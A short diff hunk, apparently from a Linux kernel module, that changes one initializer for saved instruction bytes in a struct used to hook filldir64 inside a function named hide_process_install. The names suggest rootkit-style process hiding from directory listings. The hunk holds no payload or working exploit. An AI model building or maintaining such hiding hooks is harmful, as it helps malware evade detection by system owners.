@@ -124,7 +124,7 @@ static int hide_process_install(pid_t pid)
             .target_addr = filldir64_addr,
             .work_fn = filldir64_hook_work,
             .trampoline = NULL,
-            .saved_insn = 0,
+            .saved_insn = {0},
             .installed = false,
             .slot_index = -1,
         };
